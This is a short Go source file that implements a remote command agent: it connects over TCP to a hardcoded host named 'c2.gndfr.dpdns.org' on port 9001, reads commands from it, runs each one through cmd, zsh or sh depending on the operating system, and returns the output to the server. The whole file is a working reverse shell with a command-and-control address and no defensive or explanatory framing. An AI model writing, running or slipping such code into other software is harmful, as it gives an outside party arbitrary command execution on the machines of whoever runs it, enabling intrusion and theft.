package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

func agentMain() {
	serverAddr := "c2.gndfr.dpdns.org:9001"
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		fmt.Println("Unable to connect to server:", err)
		return
	}
	defer conn.Close()
	reader := bufio.NewReader(conn)
	for {
		cmdStr, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Server disconnected.")
			return
		}
		cmdStr = strings.TrimSpace(cmdStr)
		if cmdStr == "" {
			continue
		}
		var cmd *exec.Cmd
		if isWindows() {
			cmd = exec.Command("cmd", "/C", cmdStr)
		} else if isMac() {
			cmd = exec.Command("zsh", "-c", cmdStr)
		} else {
			cmd = exec.Command("sh", "-c", cmdStr)
		}
		output, err := cmd.CombinedOutput()
		if err != nil {
			output = append(output, []byte("\n[error executing command]\n")...)
		}
		fmt.Fprintf(conn, "%s\n", string(output))
	}
}

// ...existing code...

// main is the entry point of the program.
func main() {
	agentMain()
}

// isWindows returns true if the program is running on Windows.
func isWindows() bool {
	return runtime.GOOS == "windows"
}

// isMac returns true if the program is running on macOS.
func isMac() bool {
	return runtime.GOOS == "darwin"
}
